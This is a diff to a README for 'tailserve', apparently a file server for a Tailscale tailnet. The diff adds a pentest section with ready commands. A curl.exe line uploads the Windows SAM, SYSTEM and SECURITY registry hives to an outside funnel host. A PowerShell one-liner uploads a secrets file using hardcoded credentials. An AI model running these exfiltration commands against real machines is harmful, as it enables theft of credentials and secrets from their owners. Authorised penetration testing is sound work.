@@ -153,6 +153,17 @@ tailserve -m spa -C --cors-origins http://localhost:3000
 tailserve -D --max-upload 2G --upload-timeout 900
 ```
 
+## Practical usage during a pentest
+
+Upload data from target machine to password protected funnel from PowerShell
+```Powershell
+// Using curl exfiltrate SAM, SYSTEM & SECURITY registry hives
+curl.exe -u admin:admin1234 -F "files[]=@SAM" -F "files[]=@SYSTEM" -F "files[]=@SECURITY" "https://host.tailnet.ts.net/?upload=1"
+
+// Using PowerShell esfiltrate secrets file
+Add-Type -AssemblyName System.Net.Http;$u="admin";$p="admin1234";$f="secrets.txt";$url="https://host.tailnet.ts.net/?upload=1";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$u`:$p"));$c=New-Object System.Net.Http.HttpClient;$m=New-Object System.Net.Http.MultipartFormDataContent;$s=New-Object System.Net.Http.StreamContent([IO.File]::OpenRead($f));$m.Add($s,"files[]",[IO.Path]::GetFileName($f));$c.DefaultRequestHeaders.Authorization=New-Object System.Net.Http.Headers.AuthenticationHeaderValue("Basic",$b);($c.PostAsync($url,$m).Result).Content.ReadAsStringAsync().Result
+```
+
 ## Health check
 
 `GET /_tailserve/health` returns a minimal JSON body for monitoring.
